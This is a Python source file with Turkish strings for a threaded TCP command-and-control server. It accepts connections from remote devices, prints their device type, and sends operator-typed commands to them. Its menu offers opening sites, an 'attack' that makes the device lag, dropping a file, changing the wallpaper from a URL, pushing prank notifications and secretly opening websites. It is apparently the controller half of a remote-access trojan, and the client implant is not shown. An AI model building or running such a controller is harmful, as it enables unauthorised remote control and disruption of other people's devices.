import socket
import threading

def client_handler(client_socket, address):
    print(f"[+] Bağlantı geldi: {address[0]}")
    try:
        cihaz_tipi = client_socket.recv(1024).decode()
        print(f"[+] {cihaz_tipi}")
    except:
        print("[!] Cihaz bilgisi alınamadı.")
        return

    print("""
[ Komutlar ]
1. google             → Google aç
2. saldiri            → Cihazı kasar
3. dosya              → saka.txt oluştur
4. arkaplan <url>     → Arka plan değiştir
5. saka <mesaj>       → Bildirim şakası gönder
6. gizli              → Siteleri gizli aç
7. exit               → Bağlantıyı kapat
    """)

    while True:
        komut = input("Komut >> ").strip()
        if not komut:
            continue

        try:
            client_socket.send(komut.encode())
            if komut == "exit":
                client_socket.close()
                print("[✓] Bağlantı kapatıldı.")
                break

            cevap = client_socket.recv(2048).decode()
            print(cevap)
        except:
            print("[!] Cevap alınamadı veya bağlantı kesildi.")
            break

def baslat_server(port):
    s = socket.socket()
    try:
        s.bind(("0.0.0.0", port))
    except Exception as e:
        print(f"[!] Port hatası: {e}")
        return
    s.listen(5)
    print(f"[✓] Dinleniyor: 0.0.0.0:{port}")

    while True:
        client_socket, address = s.accept()
        t = threading.Thread(target=client_handler, args=(client_socket, address))
        t.start()

if __name__ == "__main__":
    try:
        port = int(input("Port gir: "))
        baslat_server(port)
    except:
        print("[!] Geçersiz port.")
